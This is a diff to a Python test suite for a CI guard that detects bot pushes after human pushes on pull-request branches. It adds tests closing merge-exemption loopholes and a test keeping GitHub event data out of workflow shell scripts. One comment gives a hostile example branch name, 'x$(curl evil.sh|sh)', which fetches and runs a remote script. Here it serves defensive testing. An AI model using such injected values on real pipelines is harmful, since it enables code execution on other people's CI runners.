@@ -98,6 +98,25 @@ def job_block(ci: str, job: str) -> list[str]:
     return lines[start:end]
 
 
+def job_run_scripts(ci: str, job: str) -> str:
+    """Every ``run:`` script in one job, joined — the shell the runner executes."""
+    block = job_block(ci, job)
+    collected: list[str] = []
+    inside = False
+    for line in block:
+        if inside:
+            if line.strip() and not line.startswith(" " * 10):
+                inside = False
+            else:
+                collected.append(line)
+                continue
+        if line.strip() in ("run: |", "run: >"):
+            inside = True
+        elif line.strip().startswith("run: "):
+            collected.append(line)
+    return "\n".join(collected)
+
+
 def job_permissions(ci: str, job: str) -> dict[str, str]:
     """The job's own ``permissions:`` mapping, parsed rather than grepped."""
     block = job_block(ci, job)
@@ -217,7 +236,9 @@ class CommitKindTests(unittest.TestCase):
         # (47 such merges across the 114 bot-owned branches).
         entry = human_commit("a" * 40, f"Merge branch 'main' into {BOT_BRANCH}", parents=2)
         self.assertEqual(kinds(entry), ["neutral"])
-        self.assertEqual(guard.parse_commits([entry])[0].merges_in(), "main")
+        parsed = guard.parse_commits([entry])[0]
+        self.assertEqual(parsed.merges_in(), "main")
+        self.assertTrue(parsed.merges_in_the_base("main"))
 
     def test_a_merge_of_anything_but_the_base_branch_is_classified_normally(self):
         # The three merges in this repository's bot branches whose subjects show
@@ -230,6 +251,42 @@ class CommitKindTests(unittest.TestCase):
         ):
             with self.subTest(subject=subject):
                 self.assertEqual(kinds(human_commit("a" * 40, subject, parents=2)), ["human"])
+
+    def test_a_bot_push_delivered_as_a_merge_of_the_base_is_not_excused(self):
+        # A push is a push whatever subject it wears. Testing the merge exemption
+        # before the bot signals let a merge commit authored by a bot account
+        # through as routine — the incident's own shape in a routine costume.
+        merge_push = commit(
+            "b" * 40,
+            f"Merge branch 'main' into {BOT_BRANCH}",
+            author={"name": "dependabot[bot]", "email": "dependabot@github.com"},
+            author_account=DEPENDABOT,
+            committer_account=DEPENDABOT,
+            parents=2,
+        )
+        self.assertEqual(kinds(human_commit("a" * 40), merge_push), ["human", "bot"])
+        commits = guard.parse_commits([human_commit("a" * 40), merge_push])
+        self.assertFalse(guard.evaluate(BOT_BRANCH, commits, BASE)[0])
+
+    def test_a_branch_merely_ending_in_the_base_name_is_not_the_base(self):
+        # `topic/main` is somebody's topic branch. Excusing it because its last
+        # path segment reads "main" is a hole a subject line is written through.
+        merge = human_commit("b" * 40, f"Merge branch 'topic/main' into {BOT_BRANCH}", parents=2)
+        self.assertEqual(
+            kinds(bot_commit("a" * 40), merge, bot_commit("c" * 40)),
+            ["bot", "human", "bot"],
+        )
+        commits = guard.parse_commits([bot_commit("a" * 40), merge, bot_commit("c" * 40)])
+        self.assertFalse(guard.evaluate(BOT_BRANCH, commits, BASE)[0])
+
+    def test_the_remote_spellings_of_the_base_are_still_excused(self):
+        for subject in (
+            "Merge branch 'main' into x",
+            "Merge remote-tracking branch 'origin/main' into x",
+            "Merge branch 'upstream/main' into x",
+        ):
+            with self.subTest(subject=subject):
+                self.assertEqual(kinds(human_commit("a" * 40, subject, parents=2)), ["neutral"])
 
     def test_a_merge_is_only_excused_when_the_base_is_known(self):
         entry = human_commit("a" * 40, "Merge branch 'main' into x", parents=2)
@@ -656,6 +713,23 @@ class WiringTests(unittest.TestCase):
         # From the event payload, so a branch out of scope costs no API call.
         self.assertIn("--head-ref", block)
         self.assertIn("--base-ref", block)
+        self.assertIn("HEAD_REF: ${{ github.event.pull_request.head.ref }}", block)
+        self.assertIn("BASE_REF: ${{ github.event.pull_request.base.ref }}", block)
+
+    def test_no_event_data_is_interpolated_into_the_shell(self):
+        # A `${{ }}` expression in `run:` is substituted into the script source
+        # before bash parses it, and a fork's branch name is attacker-chosen: git
+        # permits `$( )`, backticks and quotes inside a ref, so
+        # `x$(curl evil.sh|sh)` would execute in this job on every pull request.
+        # The rule is pinned, not the instance — no expression of any kind may
+        # appear in this job's shell; event data travels through `env:`.
+        ci = self._read(".github/workflows/ci.yml")
+        script = job_run_scripts(ci, "bot-push-guard")
+        self.assertIn("bot_push_after_human_push_check.py", script)
+        self.assertNotIn("${{", script)
+        for variable in ("$REPO", "$PR_NUMBER", "$HEAD_REF", "$BASE_REF"):
+            with self.subTest(variable=variable):
+                self.assertIn(variable, script)
 
     def test_the_job_asks_for_exactly_the_two_scopes_it_needs(self):
         # Parsed, not grepped: a `pull-requests: write` anywhere else in the file
